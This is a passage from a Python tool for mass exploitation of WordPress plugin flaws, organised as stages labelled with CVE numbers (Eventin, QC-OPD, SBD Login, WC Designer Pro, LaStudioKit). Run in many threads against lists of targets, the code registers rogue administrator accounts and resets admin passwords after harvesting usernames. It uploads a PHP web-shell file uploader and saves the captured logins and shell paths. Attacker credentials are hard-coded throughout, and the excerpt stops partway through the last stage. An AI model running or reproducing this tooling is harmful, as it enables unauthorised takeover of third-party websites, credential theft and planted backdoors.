    PASSWORD = resolve_credential("password", "xplpass")

    def _sanitize(target_url):
        return re.sub(r'[^0-9a-zA-Z._-]', '_', target_url)

    def _save_debug(target_url, resp_text):
        fname = _sanitize(target_url) + ".resp.txt"
        path = os.path.join(DEBUG_DIR, fname)
        try:
            with open(path, "w", encoding="utf-8", errors="ignore") as f:
                f.write(resp_text)
        except Exception:
            pass

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            rand_num = random.randint(1000, 9999)
            username = f"{USERNAME_PREFIX}_{rand_num}"
            email = resolve_credential("email", "sp0k4club@gmail.com")
            password = PASSWORD

            try:
                rr = session.get(f"{base}/register", timeout=timeout, verify=False, allow_redirects=True)
                nm = re.search(r'name=["\']ct_register_nonce["\']\s+value=["\']([a-fA-F0-9]+)["\']', rr.text)
                if not nm:
                    _save_debug(base, f"NO NONCE\nRegister-page response:\n{rr.text[:600]}")
                    return False
                nonce_val = nm.group(1)
            except Exception as e:
                _save_debug(base, f"Exploit exception: {e}")
                return False

            payload = {
                "action": "ct_add_new_member",
                "ct_user_login": username,
                "ct_user_email": email,
                "ct_user_pass": password,
                "ct_user_pass_confirm": password,
                "ct_user_first": "Attacker",
                "ct_user_last": "Exploit",
                "ct_user_mobile": "0000000000",
                "ct_user_terms": "on",
                "ct_user_role": "administrator",
                "ct_register_nonce": nonce_val,
            }
            ajax_url = f"{base}/wp-admin/admin-ajax.php"
            try:
                er = session.post(ajax_url, data=payload, timeout=timeout, verify=False, allow_redirects=True)
                _save_debug(base, er.text)
                jr = er.json()
                if jr.get("success") in (True, "true", 1, "1"):
                    stage_write(stage_name, "success_results.txt",
                                f"{base} | USER: {username} | PASS: {password} | EMAIL: {email}")
                    safe_write_result("vulnurls.txt", base)
                    safe_write_result("login.txt", f"{base} | {username} | {password} | {email} | {base}/wp-login.php")
                    return True
                return False
            except Exception as e:
                _save_debug(base, f"Exploit exception on POST: {e}")
                return False
        except Exception as e:
            _save_debug(target, f"Worker general exception: {e}")
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 18: EVENTIN CSV (CVE-2025-47539)
# ============================================================================

def run_eventin_csv(targets: List[str], threads: int, timeout: int) -> Dict:
    """Eventin CSV import: create admin user via speaker CSV upload with strict login + lostpassword verification."""
    stage_name = "Eventin-CSV"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting Eventin CSV full chain ({len(targets)} targets)")

    CSV_USERNAME = resolve_credential("csv_username", "Nxploited_12345")
    CSV_EMAIL = resolve_credential("email", "sp0k4club@gmail.com")
    CSV_PASSWORD = resolve_credential("password", "Nxploited_12345")
    CSV_ROLE = "administrator"

    def check_admin_access(sess, site):
        base = normalize_url(site)
        admin_paths = ["/wp-admin/index.php", "/wp-admin/profile.php", "/wp-admin/edit.php", "/wp-admin/plugins.php", "/wp-admin/users.php"]
        markers = ['id="adminmenu"', 'id="wpadminbar"', '<div id="wpwrap">', 'class="wp-admin', 'id="wpcontent"', 'id="wpbody-content"', "users.php", "plugins.php", "edit.php"]
        deny = ["sorry, you are not allowed to access this page", "you do not have sufficient permissions", "insufficient permissions"]
        ok_pages = 0
        for ep in admin_paths:
            u = base.rstrip("/") + ep
            try:
                r = sess.get(u, timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            if r.status_code != 200: continue
            if "wp-login.php" in (r.url or ""): return False
            content = r.text or ""
            low = content.lower()
            if any(d in low for d in deny): return False
            if sum(1 for m in markers if m in content) >= 3: ok_pages += 1
            if ok_pages >= 2: return True
        try:
            r2 = sess.get(base.rstrip("/") + "/wp-admin/plugin-install.php", timeout=timeout, allow_redirects=True)
            if r2.status_code == 200:
                low2 = (r2.text or "").lower()
                if any(d in low2 for d in deny): return False
                if "upload-plugin" in low2 or "plugin-install-tab" in low2: return True
        except Exception:
            pass
        return ok_pages >= 1

    def strict_wp_login(site, username, password):
        base = normalize_url(site)
        login_url = f"{base}/wp-login.php"
        sess = build_session(timeout)
        try:
            sess.get(login_url, timeout=timeout, allow_redirects=True)
        except Exception:
            pass
        data = {"log": username, "pwd": password, "wp-submit": "Log In", "testcookie": "1"}
        try:
            r = sess.post(login_url, data=data, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        content = (r.text or "").lower()
        fails = ["incorrect username or password", "invalid username", "invalid password", "error: the username",
                  "is not registered", "authentication failed", "login failed", "unknown username"]
        if any(x in content for x in fails): return False
        if not any(c.name.startswith("wordpress_logged_in") for c in sess.cookies): return False
        return check_admin_access(sess, base)

    def verify_lostpassword(site):
        base = normalize_url(site)
        url = f"{base}/wp-login.php?action=lostpassword"
        data = {"user_login": CSV_EMAIL, "redirect_to": "", "wp-submit": "Get New Password"}
        try:
            r = requests.post(url, data=data, headers={"User-Agent": get_random_ua()}, timeout=timeout, verify=False)
            text = r.text.lower()
            success_keywords = ["check your email for the confirmation link", "email has been sent",
                                "reset link has been sent to your email", "password reset email has been sent",
                                "if your email address exists in our database"]
            return any(kw in text for kw in success_keywords)
        except Exception:
            return False

    def eventin_condition_1(site):
        try:
            base = normalize_url(site)
            r = requests.get(f"{base}/wp-json", timeout=timeout, verify=False)
            return "eventin" in r.text.lower()
        except Exception:
            return False

    def eventin_condition_2(site):
        try:
            base = normalize_url(site)
            r = requests.get(f"{base}/wp-json/eventin/v2", timeout=timeout, verify=False)
            return r.status_code == 200
        except Exception:
            return False

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base: return False
            cond1 = eventin_condition_1(target)
            cond2 = eventin_condition_2(target)
            if not (cond1 or cond2): return False
            csv_content = f"name,email,username,password,role\n{CSV_USERNAME},{CSV_EMAIL},{CSV_USERNAME},{CSV_PASSWORD},{CSV_ROLE}\n"
            csv_bytes = csv_content.encode("utf-8")
            csv_path = os.path.join(DATA_DIR, "user_updated.csv")
            try:
                with open(csv_path, "wb") as f:
                    f.write(csv_bytes)
            except Exception:
                pass
            import_url = f"{base}/wp-json/eventin/v2/speakers/import"
            try:
                files = {"speaker_import": ("user_updated.csv", csv_bytes, "text/csv")}
                cr = requests.post(import_url, files=files, timeout=timeout * 2, verify=False)
                if cr.status_code != 200 or "Successfully imported speaker" not in cr.text:
                    return False
            except Exception:
                return False
            login_ok = strict_wp_login(target, CSV_USERNAME, CSV_PASSWORD)
            lostpw_ok = verify_lostpassword(target)
            if login_ok or lostpw_ok:
                status_line = (f"{base} | USERNAME:{CSV_USERNAME} | PASSWORD:{CSV_PASSWORD} "
                               f"| LOGIN:STRICT_{'OK' if login_ok else 'FAIL'} "
                               f"| LOSTPW:{'SUCCESS' if lostpw_ok else 'FAIL'}")
                stage_write(stage_name, "success_results.txt", status_line)
                safe_write_result("vulnurls.txt", base)
                if login_ok:
                    safe_write_result("login.txt", f"{base} | {CSV_USERNAME} | {CSV_PASSWORD} | {CSV_EMAIL} | {base}/wp-login.php")
                return True
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 19: QC-OPD RESET (CVE-2025-49901)
# ============================================================================

def run_qc_opd(targets: List[str], threads: int, timeout: int) -> Dict:
    """QC-OPD password reset: find SLD page with _wpnonce -> reset password -> dual-mode login verify."""
    stage_name = "QC-OPD"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting QC-OPD full chain ({len(targets)} targets)")

    RESET_PAGES = ["restore", "reset-password", "forgot-password", "password-reset", "recover-password",
                   "restore-password", "lost-password", "account-recovery", "recover-account", "set-new-password", "change-password"]
    EXTRA_PAGES = ["", "login", "signin", "my-account", "account", "profile", "member", "members"]
    FIXED_PASSWORD = resolve_credential("password", "newhackerpass123")

    def split_wp_base(url):
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urlparse(url)
        base_host = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"
        if path == "/": return base_host, ""
        return base_host, path.rstrip("/")

    def build_wp_url(base_host, wp_base, path):
        if not path.startswith("/"): path = "/" + path
        return base_host + (wp_base + path).replace("//", "/")

    def extract_qc_opd_nonce_from_js(body):
        if not body: return None
        m = re.search(r'["\']action["\']\s*:\s*["\']qc-opd["\'][^}]+["\']nonce["\']\s*:\s*["\']([0-9A-Za-z]+)["\']', body, re.I)
        if m: return m.group(1)
        m = re.search(r'["\']nonce["\']\s*:\s*["\']([0-9A-Za-z]+)["\'][^}]+["\']action["\']\s*:\s*["\']qc-opd["\']', body, re.I)
        if m: return m.group(1)
        m = re.search(r'(?:qc[_-]?opd[_-]?nonce|qcOpdNonce)\s*=\s*["\']([0-9A-Za-z]+)["\']', body, re.I)
        if m: return m.group(1)
        m = re.search(r'(?:qc[_-]?opd|qcOpd)\s*=\s*\{[^}]*["\']nonce["\']\s*:\s*["\']([0-9A-Za-z]+)["\']', body, re.I)
        if m: return m.group(1)
        for snip in re.finditer(r'.{0,120}qc-opd.{0,120}', body, re.I | re.DOTALL):
            m2 = re.search(r'["\']([0-9A-Za-z]{8,20})["\']', snip.group(0))
            if m2: return m2.group(1)
        return None

    def extract_wpnonce(body):
        if not body: return None
        for pat in [
            r'name=["\']_wpnonce["\']\s+value=["\']([0-9A-Za-z]+)["\']',
            r'id=["\']_wpnonce["\']\s+name=["\']_wpnonce["\']\s+value=["\']([0-9A-Za-z]+)["\']',
            r'_wpnonce["\']\s*value=["\']([0-9A-Za-z]+)["\']',
            r'name=["\']_wpnonce[_-]?qc[-_]?opd["\']\s+value=["\']([0-9A-Za-z]+)["\']',
            r'id=["\']qc-opd-nonce["\'][^>]*value=["\']([0-9A-Za-z]+)["\']',
        ]:
            m = re.search(pat, body, re.I)
            if m: return m.group(1)
        return extract_qc_opd_nonce_from_js(body)

    def page_contains_sld_and_form(body):
        if not body: return False
        low = body.lower()
        if "sld" not in low: return False
        if "_wpnonce" not in low: return False
        if 'name="action"' in low and 'value="restore"' in low: return True
        if "<form" in low and 'name="_wpnonce"' in low: return True
        return False

    def extract_internal_links(body, base_url, max_links=25):
        links = []
        if not body: return links
        try:
            host = base_url.split("://", 1)[1].split("/", 1)[0]
        except Exception:
            host = ""
        for m in re.finditer(r'href=["\']([^"\']+)["\']', body, re.I):
            href = m.group(1)
            if href.startswith("#"): continue
            full = urljoin(base_url, href)
            parsed = urlparse(full)
            if parsed.scheme not in ("http", "https"): continue
            if host and host not in (parsed.netloc or ""): continue
            if full not in links: links.append(full)
            if len(links) >= max_links: break
        return links

    def find_reset_page_and_nonce_expanded(sess, base_host, wp_base):
        tried = set()
        def try_url(url):
            if url in tried: return None, None
            tried.add(url)
            try:
                r = sess.get(url, timeout=timeout, allow_redirects=True)
            except Exception:
                return None, None
            if r.status_code != 200: return None, None
            body = r.text or ""
            if not page_contains_sld_and_form(body): return None, None
            nonce = extract_wpnonce(body)
            return (r.url, nonce) if nonce else (None, None)
        for slug in RESET_PAGES:
            slug = slug.strip("/")
            for variant in (f"/{slug}/", f"/{slug}"):
                url = build_wp_url(base_host, wp_base, variant)
                page_url, nonce = try_url(url)
                if page_url and nonce: return page_url, nonce
        for slug in EXTRA_PAGES:
            slug = slug.strip("/")
            path = "/" if slug == "" else f"/{slug}/"
            page_url, nonce = try_url(build_wp_url(base_host, wp_base, path))
            if page_url and nonce: return page_url, nonce
        try:
            home_url = build_wp_url(base_host, wp_base, "/")
            rh = sess.get(home_url, timeout=timeout, allow_redirects=True)
        except Exception:
            return None, None
        if rh.status_code == 200 and rh.text:
            links = extract_internal_links(rh.text, rh.url, max_links=25)
            for link in links:
                page_url, nonce = try_url(link)
                if page_url and nonce: return page_url, nonce
        return None, None

    AUTHOR_PATTERN = re.compile(r"/author/([^/]+)")
    AUTHOR_BODY_PATTERNS = [
        re.compile(r'author-\w+">([a-z0-9_\-]+)<', re.I),
        re.compile(r"/author/([a-z0-9_\-]+)/", re.I),
        re.compile(r'"slug":"([a-z0-9_\-]+)"', re.I),
        re.compile(r'"username":"([a-z0-9_\-]+)"', re.I),
    ]

    def check_admin_access(sess, root_url):
        admin_paths = ["/wp-admin/index.php", "/wp-admin/profile.php", "/wp-admin/edit.php", "/wp-admin/plugins.php", "/wp-admin/users.php"]
        markers = ['id="adminmenu"', 'id="wpadminbar"', '<div id="wpwrap">', 'class="wp-admin', 'id="wpcontent"', 'id="wpbody-content"', "users.php", "plugins.php", "edit.php"]
        deny = ["sorry, you are not allowed to access this page", "you do not have sufficient permissions", "insufficient permissions"]
        ok_pages = 0
        for ep in admin_paths:
            u = root_url.rstrip("/") + ep
            try:
                r = sess.get(u, timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            if r.status_code != 200: continue
            if "wp-login.php" in (r.url or ""): return False
            content = r.text or ""
            low = content.lower()
            if any(d in low for d in deny): return False
            if sum(1 for m in markers if m in content) >= 3: ok_pages += 1
            if ok_pages >= 2: return True
        try:
            r2 = sess.get(root_url.rstrip("/") + "/wp-admin/plugin-install.php", timeout=timeout, allow_redirects=True)
            if r2.status_code == 200:
                low2 = (r2.text or "").lower()
                if any(d in low2 for d in deny): return False
                if "upload-plugin" in low2 or "plugin-install-tab" in low2: return True
        except Exception:
            pass
        return ok_pages >= 1

    def find_wp_login_path(sess, base_host, wp_base):
        for p in ["/wp-login.php", "/wordpress/wp-login.php", "/wp/wp-login.php", "/blog/wp-login.php", "/cms/wp-login.php", "/wp/login.php"]:
            try:
                r = sess.get(build_wp_url(base_host, wp_base, p), timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            txt = r.text or ""
            if r.status_code == 200 and "<form" in txt and "password" in txt.lower():
                return p
        return "/wp-login.php"

    def strict_login_attempt(sess, base_host, wp_base, login_path, username, password):
        root_site = build_wp_url(base_host, wp_base, "/")
        login_url = build_wp_url(base_host, wp_base, login_path)
        try:
            sess.get(login_url, timeout=timeout, allow_redirects=True)
        except Exception:
            pass
        data = {"log": username.strip(), "pwd": password, "wp-submit": "Log In", "testcookie": "1"}
        try:
            r = sess.post(login_url, data=data, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        content = (r.text or "").lower()
        fails = ["incorrect username or password", "invalid username", "invalid password", "error: the username",
                  "is not registered", "authentication failed", "login failed", "unknown username"]
        if any(x in content for x in fails): return False
        if not any(c.name.startswith("wordpress_logged_in") for c in sess.cookies): return False
        return check_admin_access(sess, root_site)

    def collect_candidates(base_host, wp_base):
        sess = build_session(timeout)
        root = build_wp_url(base_host, wp_base, "/")
        users = set()
        for i in range(1, 11):
            try:
                u = f"{root}/?author={i}"
                r = sess.get(u, timeout=timeout, allow_redirects=False)
                if r.status_code in (301, 302):
                    loc = r.headers.get("location", "") or r.headers.get("Location", "")
                    m = AUTHOR_PATTERN.search(loc)
                    if m: users.add(m.group(1))
                r2 = sess.get(u, timeout=timeout, allow_redirects=True)
                if r2.status_code == 200 and r2.text:
                    for patt in AUTHOR_BODY_PATTERNS:
                        for x in patt.findall(r2.text): users.add(x)
            except Exception:
                continue
        try:
            api = root.rstrip("/") + "/wp-json/wp/v2/users"
            r3 = sess.get(api, timeout=timeout)
            if r3.status_code == 200:
                data = r3.json()
                if isinstance(data, list):
                    for entry in data:
                        if isinstance(entry, dict):
                            for key in ("slug", "username", "name"):
                                v = entry.get(key)
                                if v: users.add(str(v))
        except Exception:
            pass
        parsed = urlparse(root)
        host = parsed.netloc.split(":")[0].lower()
        if host.startswith("www."): host = host[4:]
        first_label = host.split(".")[0]
        if first_label and len(first_label) > 2: users.add(first_label)
        users.add("admin")
        users = {u for u in users if u and 2 < len(u) < 50}
        return sorted(users) if users else ["admin"]

    def send_reset_for_user(sess, page_url, username, nonce):
        data = {"qc-restore-pwd": "restore", "qc-restore-pwd-type": "user", "qc-uid": username, "pass": FIXED_PASSWORD, "_wpnonce": nonce}
        try:
            r = sess.post(page_url, data=data, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        if r.status_code not in (200, 302, 301): return False
        body = (r.text or "").lower()
        fails = ["invalid user", "unknown user", "user not found", "invalid username", "error:", "error ", "failed"]
        return not any(f in body for f in fails)

    def detect_direct_session_mode(sess, base_host, wp_base):
        if not any(c.name.startswith("wordpress_logged_in") for c in sess.cookies): return False
        return check_admin_access(sess, build_wp_url(base_host, wp_base, "/"))

    def exploit_target(target: str) -> bool:
        try:
            base_host, wp_base = split_wp_base(target)
            label = f"{base_host}{wp_base or ''}"
            sess = build_session(timeout)
            page_url, nonce = find_reset_page_and_nonce_expanded(sess, base_host, wp_base)
            if not nonce or not page_url: return False
            usernames = collect_candidates(base_host, wp_base)
            if not usernames: return False
            reset_success_any = False
            session_mode_hits = 0
            password_mode_hits = 0
            for username in usernames:
                ok = send_reset_for_user(sess, page_url, username, nonce)
                if ok:
                    reset_success_any = True
                    if detect_direct_session_mode(sess, base_host, wp_base):
                        ts = time.strftime("%Y-%m-%dT%H:%M:%S")
                        stage_write(stage_name, "reset_mass_success.txt",
                                    f"[{ts}] {label} - account={username}  pass={FIXED_PASSWORD}  mode=session")
                        session_mode_hits += 1
            if not reset_success_any: return False
            sess0 = build_session(timeout)
            login_path = find_wp_login_path(sess0, base_host, wp_base)
            for username in usernames:
                s2 = build_session(timeout)
                if strict_login_attempt(s2, base_host, wp_base, login_path, username, FIXED_PASSWORD):
                    ts = time.strftime("%Y-%m-%dT%H:%M:%S")
                    stage_write(stage_name, "reset_mass_success.txt",
                                f"[{ts}] {label} - account={username}  pass={FIXED_PASSWORD}  mode=password")
                    password_mode_hits += 1
            hits = session_mode_hits + password_mode_hits
            if hits > 0:
                safe_write_result("vulnurls.txt", label)
                return True
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 20: SBD LOGIN (CVE-2025-53580)
# ============================================================================

def run_sbd_login(targets: List[str], threads: int, timeout: int) -> Dict:
    """SBD Login exploit: find sbd restore page -> brute user IDs -> login verify with REST + dashboard fallback."""
    stage_name = "SBD-Login"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting SBD Login full chain ({len(targets)} targets)")

    NEW_PASS = resolve_credential("password", "NxploitedNX")
    MAX_USER_ID = 3

    BASE_HEADERS = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-cache", "Pragma": "no-cache",
                    "Upgrade-Insecure-Requests": "1", "DNT": "1"}

    CANDIDATE_RESTORE_PATHS = ["/login", "/log-in", "/signin", "/sign-in", "/user-login", "/account/login",
                               "/account/log-in", "/restore", "/password-reset", "/reset-password", "/lost-password",
                               "/lostpassword", "/user/restore", "/my-account", "/members/login", "/member-login",
                               "/customer-login", "/wp-login.php", "/blog/login", "/blog/log-in", "/auth/login",
                               "/auth/restore", "/sbd-login", "/sbd-restore"]

    AUTHOR_PATTERN = re.compile(r"/author/([^/]+)")
    AUTHOR_BODY_PATTERNS = [
        re.compile(r'author-\w+">([a-z0-9_-]+)<', re.I),
        re.compile(r"/author/([a-z0-9_-]+)/", re.I),
        re.compile(r'"slug":"([a-z0-9_-]+)"', re.I),
        re.compile(r'"username":"([a-z0-9_-]+)"', re.I),
    ]

    def enum_from_author_param(base, delay=0.0):
        users = set()
        for i in range(1, 10):
            author_url = f"{base}/?author={i}"
            try:
                r = requests.get(author_url, timeout=timeout, allow_redirects=False, verify=False,
                                 headers={"User-Agent": get_random_ua(), "DNT": "1", "Cookie": "wordpress_test_cookie=WP+Cookie+check"})
                if r.status_code in (301, 302):
                    loc = r.headers.get("location", "") or r.headers.get("Location", "")
                    m = AUTHOR_PATTERN.search(loc)
                    if m: users.add(m.group(1))
                if delay > 0: time.sleep(delay)
                r2 = requests.get(author_url, timeout=timeout, verify=False, headers={"User-Agent": get_random_ua()})
                if r2.status_code == 200 and r2.text:
                    for pat in AUTHOR_BODY_PATTERNS:
                        for u in pat.findall(r2.text): users.add(u)
                if delay > 0: time.sleep(delay)
            except Exception:
                continue
        return users

    def enum_from_rest_api(base, delay=0.0):
        users = set()
        api_url = f"{base}/wp-json/wp/v2/users"
        try:
            r = requests.get(api_url, timeout=timeout, verify=False, headers={"User-Agent": get_random_ua()})
            if r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, list):
                        for user in data:
                            if isinstance(user, dict):
                                if "slug" in user: users.add(str(user["slug"]))
                                if "username" in user: users.add(str(user["username"]))
                except Exception:
                    pass
        except Exception:
            pass
        if delay > 0: time.sleep(delay)
        return users

    def enumerate_usernames(base, delay=0.0):
        users = set()
        users.update(enum_from_author_param(base, delay))
        users.update(enum_from_rest_api(base, delay))
        users.add("admin")
        try:
            host = urlparse(base).netloc.split(":")[0]
            domain_part = host.split(".")[0]
            if domain_part and len(domain_part) > 2: users.add(domain_part)
        except Exception:
            pass
        return users

    def find_restore_url_with_sbd(session, base):
        for path in CANDIDATE_RESTORE_PATHS:
            url = base.rstrip("/") + path
            try:
                r = session.get(url, timeout=timeout, verify=False, headers={"User-Agent": get_random_ua()})
            except Exception:
                continue
            if r.status_code != 200: continue
            if "sbd" in (r.text or "").lower(): return r.url
        return None

    def try_sbd_restore_for_user_ids(session, restore_url):
        for uid in range(1, MAX_USER_ID + 1):
            data = {"qcpd-restore-pwd": "restore", "qcpd-restore-pwd-type": "user", "qcpd-uid": str(uid), "pass": NEW_PASS}
            try:
                session.post(restore_url, data=data, timeout=timeout, verify=False, allow_redirects=False,
                             headers={"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded"})
            except Exception:
                continue

    def try_login_with_password(base, username, password):
        root = base.rstrip("/")
        s = build_session(timeout)
        login_url = f"{root}/wp-login.php"
        data = {"log": username, "pwd": password, "wp-submit": "Log In", "testcookie": "1"}
        headers = {"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded",
                   "Cookie": "wordpress_test_cookie=WP+Cookie+check"}
        try:
            r = s.post(login_url, data=data, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
        except Exception:
            return False, s, "login_error"
        logged_in = any(c.name.startswith("wordpress_logged_in") for c in s.cookies)
        if not logged_in:
            sc = r.headers.get("Set-Cookie", "")
            if "wordpress_logged_in" in sc: logged_in = True
        if not logged_in: return False, s, "login_failed"
        return True, s, "login_ok"

    def check_admin_via_rest(session, base):
        rest_url = f"{base}/wp-json/wp/v2/users/me"
        try:
            r = session.get(rest_url, timeout=timeout, verify=False, headers={"User-Agent": get_random_ua()})
        except Exception:
            return False, "rest_error"
        if r.status_code != 200: return False, f"rest_status:{r.status_code}"
        try:
            caps = r.json().get("capabilities") or {}
        except Exception:
            return False, "rest_invalid_json"
        return (True, "ADMIN_REST") if isinstance(caps, dict) and caps.get("manage_options") else (False, "rest_no_caps")

    def verify_admin_dashboard(session, base):
        root = base.rstrip("/")
        global_markers = ["wp-admin-bar", "adminmenu", "manage_options", "update-core.php", "options-general.php"]
        users_markers = ["users.php", 'class="username"', 'table class="wp-list-table']
        for u in [f"{root}/wp-admin/users.php", f"{root}/wp-admin/index.php", f"{root}/wp-admin/"]:
            try:
                r = session.get(u, timeout=timeout, verify=False, allow_redirects=False, headers={"User-Agent": get_random_ua()})
            except Exception:
                continue
            if r.status_code == 200:
                body = (r.text or "").lower()
                if any(m in body for m in global_markers):
                    if "users.php" in u or any(m in body for m in users_markers):
                        return True, f"ADMIN_WPADMIN({u})"
            elif r.status_code in (301, 302):
                loc = r.headers.get("Location", "") or r.headers.get("location", "")
                if "wp-login.php" in loc: return False, "wpadmin_redirect_login"
        return False, "wpadmin_no_markers"

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base: return False
            session = build_session(timeout)
            restore_url = find_restore_url_with_sbd(session, base)
            if not restore_url: return False
            try_sbd_restore_for_user_ids(session, restore_url)
            users = enumerate_usernames(base, delay=0.0)
            if not users: users = {"admin"}
            for user in sorted(users):
                ok, s_login, detail_login = try_login_with_password(base, user, NEW_PASS)
                if not ok: continue
                rest_ok, rest_detail = check_admin_via_rest(s_login, base)
                is_admin = False
                detail = detail_login
                if rest_ok:
                    is_admin = True
                    detail = rest_detail
                else:
                    wp_ok, wp_detail = verify_admin_dashboard(s_login, base)
                    if wp_ok:
                        is_admin = True
                        detail = wp_detail
                    else:
                        detail = f"not_admin({rest_detail}, {wp_detail})"
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                admin_flag = "ADMIN" if is_admin else "USER"
                stage_write(stage_name, "Nx_sbd_login_hits.txt",
                            f"[{ts}] {base} - type={admin_flag} - user={user} "
                            f"- login=/wp-login.php user={user} pass={NEW_PASS} - detail={detail}")
                if is_admin:
                    safe_write_result("vulnurls.txt", base)
                    safe_write_result("login.txt", f"{base} | {user} | {NEW_PASS} | {user}@nx.com | {base}/wp-login.php")
                return True
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 21: WC DESIGNER PRO (CVE-2025-6440)
# ============================================================================

def run_wc_designer_pro(targets: List[str], threads: int, timeout: int) -> Dict:
    """WC Designer Pro: probe AJAX vulnerability -> upload shell via wcdp_save_canvas_design_ajax."""
    stage_name = "WC-DesignerPro"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "wc_designer_pro_results.txt"
    log_info(stage_name, f"Starting WC Designer Pro full chain ({len(targets)} targets, {threads} threads)")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            ajax_url = f"{base}/wp-admin/admin-ajax.php"
            try:
                pr = session.post(ajax_url, data={"action": "wcdp_save_canvas_design_ajax"}, timeout=timeout, verify=False)
                if '{"userID":false,"filesCMYK":[],"success":0}' in pr.text.replace(" ", ""):
                    shell_content = b'<?php echo \'<title> NezukaBot Here! </title><b><pre>{ Priv8 Uploader By NezukaBot }</b>\'.\'<br><br>\'.\'<b>System Info:</b> \'.php_uname().\'<br>\'.\'<b>Current Directory:</b> \'.getcwd();echo \'<br><form method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="20"><input name="_upl" type="submit" id="_upl" value="upload"></form></td></tr></table></pre>\';if($_FILES){if(!empty($_FILES[\'file\'])){move_uploaded_file($_FILES[\'file\'][\'tmp_name\'],$_FILES[\'file\'][\'name\']);echo "<b>File Uploaded !!!</b><br>name : ".$_FILES[\'file\'][\'name\']."<br>size : ".$_FILES[\'file\'][\'size\']."<br>type : ".$_FILES[\'file\'][\'type\'];}else{echo "<b>Upload Failed !!!</b><br><br>";}}?>\n'
                    sh_path = os.path.join(DATA_DIR, "shell.php")
                    if os.path.isfile(sh_path):
                        try:
                            with open(sh_path, "rb") as sf:
                                shell_content = sf.read()
                        except Exception:
                            pass
                    payload = {"action": "wcdp_save_canvas_design_ajax",
                               "params": '{"mode":"save","editor":"frontend","uniq":"Nxploited","files":[{"name":"nxploited","ext":"php","count":"file1"}]}'}
                    files = {"file1": ("shell.php", shell_content, "application/x-php")}
                    sr = session.post(ajax_url, data=payload, files=files, timeout=timeout * 2, verify=False)
                    if '"success":true' in sr.text.replace(" ", "").lower() and "userid" in sr.text.lower():
                        shell_path = f"{base}/wp-content/uploads/wcdp-uploads/temp/Nxploited/nxploited.php"
                        stage_write("WC-DesignerPro", f"{base} | {shell_path}")
                        safe_write_result("vulnurls.txt", base)
                        return True
            except Exception:
                return False
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 22: LASTUDIOKIT (CVE-2025-68001)
# ============================================================================

def run_lastudiokit(targets: List[str], threads: int, timeout: int) -> Dict:
    """LaStudioKit: extract ajaxNonce -> register admin via lakit_ajax -> login verify with 4-state distinction."""
    stage_name = "LaStudioKit"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting LaStudioKit full chain ({len(targets)} targets)")

    ADMIN_EMAIL = resolve_credential("email", "sp0k4club@gmail.com")
    ADMIN_PASSWORD = resolve_credential("password", "adminSA")
    ADMIN_USERNAME = resolve_credential("lstk_username", "Nx_admin")

    def extract_ajax_nonce(site):
        base = normalize_url(site)
        for path in ["", "/", "/index.php", "/home", "/start", "/?page_id=1"]:
            url = base + path
            try:
                r = requests.get(url, timeout=timeout, verify=False, headers={"User-Agent": get_random_ua()})
            except Exception:
                continue
            if r.status_code != 200: continue
